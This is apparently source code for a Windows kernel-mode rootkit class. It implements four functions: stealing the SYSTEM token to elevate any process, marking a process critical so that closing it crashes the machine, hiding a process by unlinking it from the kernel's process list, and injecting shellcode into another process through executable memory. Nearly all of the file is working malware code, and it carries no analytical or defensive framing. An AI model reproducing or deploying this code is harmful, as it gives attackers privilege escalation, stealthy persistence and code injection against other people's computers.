#include "stdlib.h"
#include "hijack.hpp"
#include "rootkit.hpp"

NTSTATUS Rootkit::ProcessElevation(UINT32 PID)
{
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS pTargetProcess, pSrcProcess;
	ULONG srcPid = 4;

	status = PsLookupProcessByProcessId(ULongToHandle(PID), &pTargetProcess);
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		DbgPrint("[-] Target PID PsLookup failed\n");
#endif
		return status;
	}

#if DEBUG
	DbgPrint("[+] Target EProcess address: 0x%p\n", pTargetProcess);
#endif

	status = PsLookupProcessByProcessId(ULongToHandle(srcPid), &pSrcProcess);
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		DbgPrint("[-] Source PID PsLookup failed\n");
#endif
		return status;
	}

#if DEBUG
	DbgPrint("[+] Source EProcess address: 0x%p\n", pSrcProcess);
	DbgPrint("[+] Setting source token to the target token\n");
#endif

	* (UINT64*)((UINT64)pTargetProcess + (UINT64)TOKEN) = *(UINT64*)(UINT64(pSrcProcess) + (UINT64)TOKEN);

#if DEBUG
	DbgPrint("[*] Source token copied to the target!\n");
#endif

	return status;
}

NTSTATUS Rootkit::ProtectProcess(UINT32 PID)
{
	NTSTATUS status = STATUS_SUCCESS;

	CLIENT_ID clientId;
	HANDLE handle, hToken;

	TOKEN_PRIVILEGES tkp = { 0 };
	OBJECT_ATTRIBUTES objAttr;
	ULONG BreakOnTermination = 1;

	clientId.UniqueThread = NULL;
	clientId.UniqueProcess = ULongToHandle(PID);
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

	status = ZwOpenProcess(&handle, PROCESS_ALL_ACCESS, &objAttr, &clientId);
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		DbgPrint("[-] Failed to open process\n");
#endif
		return status;
	}

	status = ZwOpenProcessTokenEx(handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, OBJ_KERNEL_HANDLE, &hToken);
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		DbgPrint("[-] Failed to acquire token handle\n");
#endif
		ZwClose(hToken);
		return status;
	}

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tkp.Privileges[0].Luid = RtlConvertLongToLuid(SE_DEBUG_PRIVILEGE);

	status = ZwAdjustPrivilegesToken(hToken, FALSE, &tkp, 0, NULL, NULL);
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		DbgPrint("[-] Failed to adjust token\n");
#endif
		ZwClose(hToken);
		return status;
	}

	status = ZwSetInformationProcess(handle, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		DbgPrint("[-] Failed to set process information\n");
#endif
		ZwClose(hToken);
		return status;
	}
#if DEBUG
	DbgPrint("[!] Process successfully set as critical!\n");
#endif

	tkp.Privileges[0].Luid = RtlConvertLongToLuid(SE_TCB_PRIVILEGE);
	status = ZwSetInformationProcess(handle, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		DbgPrint("[-] Failed to set process information : 2\n");
#endif
		ZwClose(hToken);
		return status;
	}

#if DEBUG
	DbgPrint("[!] The process has become part of the system!\n");
	DbgPrint("[!] You won't be able to close the process until next reboot. Closing the process will result in a blue screen\n");
#endif

	ZwClose(hToken);
	return status;
}

VOID RemoveTheLinks(PLIST_ENTRY Current)
{
	PLIST_ENTRY Previous, Next;

	Previous = (Current->Blink);
	Next = (Current->Flink);

	Previous->Flink = Next;
	Next->Blink = Previous;

	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	Current->Blink = (PLIST_ENTRY)&Current->Flink;
	Current->Flink = (PLIST_ENTRY)&Current->Flink;
	return;
}

PCHAR Rootkit::HideProc(UINT32 PID)
{
	LPSTR result = (LPSTR)ExAllocatePool(NonPagedPool, sizeof(ULONG) + 20);;

	ULONG PID_OFFSET = ACTIVE_PROCESS_LINKS;
	ULONG LIST_OFFSET = PID_OFFSET;

	INT_PTR ptr;
	LIST_OFFSET += sizeof(ptr);

	PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();

	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);

	if (*(UINT32*)CurrentPID == PID) {
		RemoveTheLinks(CurrentList);
		return (PCHAR)result;
	}

	PEPROCESS StartProcess = CurrentEPROCESS;

	CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
	CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
	CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);

	while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS)
	{
		if (*(UINT32*)CurrentPID == PID) {
			RemoveTheLinks(CurrentList);
			return (PCHAR)result;
		}

		CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
		CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
		CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	}

	return (PCHAR)result;
}

PVOID Rootkit::InjectShellcode(Shell* shell)
{
	NTSTATUS status = STATUS_SUCCESS;
	HANDLE handle;
	PEPROCESS process, cProcess;
	PVOID buffer = { 0 };
	CLIENT_ID clientId = { 0 };
	OBJECT_ATTRIBUTES objAttr = { 0 };
	SIZE_T shellSize = shell->size;
	PVOID shellBuf = reinterpret_cast<PVOID>(shell->shellcode);

	cProcess = PsGetCurrentProcess();

	clientId.UniqueThread = NULL;
	clientId.UniqueProcess = ULongToHandle(shell->pid);
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

	status = ZwOpenProcess(&handle, PROCESS_ALL_ACCESS, &objAttr, &clientId);
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		DbgPrint("[-] Could not open process\n");
#endif
		return NULL;
	}

	status = PsLookupProcessByProcessId((HANDLE)shell->pid, &process);
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		DbgPrint("[-] Could not find process\n");
#endif
		ZwClose(handle);
		return NULL;
	}

	status = ZwAllocateVirtualMemory(handle, &buffer, NULL, &shellSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		DbgPrint("[-] Could not allocate memory\n");
#endif
		ZwClose(handle);
		return NULL;
	}

	SIZE_T rSize;
	status = MmCopyVirtualMemory(cProcess, shellBuf, process, buffer, shellSize, KernelMode, &rSize);
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		DbgPrint("[-] Could not copy memory\n");
#endif
		ZwClose(handle);
		return NULL;
	}

	status = ZwProtectVirtualMemory(handle, &buffer, &shellSize, PAGE_EXECUTE_READ, (PULONG)PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status))
	{
#if DEBUG
		KdPrint(("[-] Could not change memory protection"));
#endif
		ZwClose(handle);
	}

	ZwClose(handle);

	return buffer;
}